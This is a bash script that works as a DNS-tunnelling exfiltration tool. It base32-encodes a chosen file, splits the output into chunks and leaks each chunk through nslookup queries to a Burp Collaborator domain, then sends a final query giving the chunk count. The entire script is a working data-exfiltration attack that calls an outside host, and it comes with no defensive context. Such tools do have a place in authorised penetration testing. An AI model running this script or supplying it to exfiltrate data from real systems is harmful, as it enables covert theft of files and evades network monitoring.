#!/bin/bash

#########################
# Help Message          #
#########################
display_help() {
    echo "Usage: $0 [option...]" >&2
    echo
    echo "   -h, --help                 This help message            "
    echo "   -d, --domain               The burp collaborator domain "
    echo "   -f, --file                 The file to be exfiltrated   "
    echo "   -v, --verbose              Enables verbose output       "
    echo
    exit 1
}

#Setup various variables
dnsFlag="nspi"
amountFlag="amount"
collabDomain=
exfilFile=
verbose=

#Process command line args
while :
do
    case "$1" in
      -h | --help)
          display_help  # Call your function
          exit 0
          ;;

      -d | --domain)
          collabDomain="$2"
          shift 2
          ;;

      -f | --file)
          exfilFile="$2"
          shift 2
          ;;

      -v | --v | --ve | --ver | --verb | --verbo | --verbos | --verbose)
          verbose=1
          shift
          ;;

      --) # End of all options
          shift
          break
          ;;
      -*)
          echo "Error: Unknown option: $1" >&2
          ## or call function display_help
          exit 1 
          ;;
      *)  # No more options
          break
          ;;
    esac
done

#If parameters aren't provided, prompt for them
if [[ ! $collabDomain ]]
then
    echo -n "Burp Collaborator address: "
    read collabDomain
else
    if [ "$verbose" = 1 ]; then
        echo "Burp Collaborator address: $collabDomain"
    fi
fi

if [[ ! $exfilFile ]]
then
    echo -n "File to exfiltrate: "
    read exfilFile
else
    if [ "$verbose" = 1 ]; then
        echo "File to exfilrate: $collabDomain"
    fi
fi

#Convert data to base32, space into 63-character chunks, delimit on spaces
#The base32 program might not be included, might want to write base32 encoding into here
data="$(cat $exfilFile | base32)"
data="$(echo $data | sed -r 's/(.{63})/\1 /g')"
data="$(echo $data| tr = ' ')"

#Set a counter to keep track of size
counter=0
for word in $data
do
    if [ "$verbose" = 1 ]; then
        echo "Tunneling chunk $counter: $dnsFlag.$word.$counter.$collabDomain"
    fi
    nslookup "$dnsFlag.$word.$counter.$collabDomain" > /dev/null
    ((counter+=1))
done

#Let the server know how many requests we sent
if [ "$verbose" = 1 ]; then
        echo "Tunneling amount chunk: $dnsFlag.$amountFlag.$counter.$collabDomain"
fi
nslookup "$dnsFlag.$amountFlag.$counter.$collabDomain" > /dev/null
